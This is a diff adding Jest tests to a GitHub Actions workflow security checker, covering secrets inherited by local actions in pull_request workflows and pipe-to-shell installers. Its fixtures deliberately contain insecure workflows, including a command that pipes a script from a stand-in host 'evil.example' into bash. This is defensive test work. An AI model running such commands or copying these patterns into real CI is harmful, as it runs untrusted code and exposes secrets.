@@ -135,6 +135,50 @@ describe('checkGithubWorkflowSecurity', () => {
     expect(checkGithubWorkflowSecurity(root)).toEqual([]);
   });
 
+  it('rejects local pull_request actions that inherit workflow-level secret env', () => {
+    writeFixture(
+      root,
+      '.github/workflows/bad-local-workflow-env.yml',
+      `
+      name: Bad local inherited workflow env
+      on: pull_request
+      env:
+        TOKEN: \${{ secrets.TEST_TOKEN }}
+      jobs:
+        review:
+          runs-on: ubuntu-latest
+          steps:
+            - uses: ./.github/actions/review
+      `,
+    );
+
+    expect(messages(root)).toContain(
+      'local action receives secrets in a pull_request workflow',
+    );
+  });
+
+  it('rejects local pull_request actions that inherit job-level secret env', () => {
+    writeFixture(
+      root,
+      '.github/workflows/bad-local-job-env.yml',
+      `
+      name: Bad local inherited job env
+      on: pull_request
+      jobs:
+        review:
+          runs-on: ubuntu-latest
+          env:
+            TOKEN: \${{ secrets.TEST_TOKEN }}
+          steps:
+            - uses: ./.github/actions/review
+      `,
+    );
+
+    expect(messages(root)).toContain(
+      'local action receives secrets in a pull_request workflow',
+    );
+  });
+
   it('rejects workflow_run jobs that expose secrets to pull_request head code', () => {
     writeFixture(
       root,
@@ -239,6 +283,30 @@ describe('checkGithubWorkflowSecurity', () => {
           runs-on: ubuntu-latest
           steps:
             - run: curl -Ls https://get.maestro.mobile.dev | bash
+      `,
+    );
+
+    expect(messages(root)).toContain(
+      'pipe-to-shell installer must be replaced or checksum-verified',
+    );
+  });
+
+  it('rejects pipe-to-shell installers even when another artifact is checksum verified', () => {
+    writeFixture(
+      root,
+      '.github/workflows/bad-installer-unrelated-checksum.yml',
+      `
+      name: Bad installer unrelated checksum
+      on: workflow_dispatch
+      jobs:
+        test:
+          runs-on: ubuntu-latest
+          steps:
+            - run: |
+                curl -Ls https://evil.example/install.sh | bash
+                curl -fsSLO https://example.test/tool.tar.gz
+                curl -fsSLO https://example.test/checksums.txt
+                grep " tool.tar.gz$" checksums.txt | sha256sum -c -
       `,
     );
 
